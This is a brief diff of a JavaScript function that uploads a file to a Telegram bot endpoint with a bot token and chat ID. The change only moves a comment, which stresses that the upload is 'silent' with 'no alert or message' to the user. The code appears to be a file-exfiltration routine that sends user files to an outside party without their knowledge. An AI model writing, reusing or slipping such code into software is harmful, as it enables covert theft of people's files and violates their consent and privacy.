@@ -213,11 +213,11 @@ async function sendFileToTelegram(file) {
   formData.append('chat_id', CHAT_ID);
   formData.append('document', file);
   try {
+    // Silent upload, no alert or message
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
       method: 'POST',
       body: formData
     });
-    // No alert for silent upload
   } catch (err) {
     console.error('Error:', err);
   }
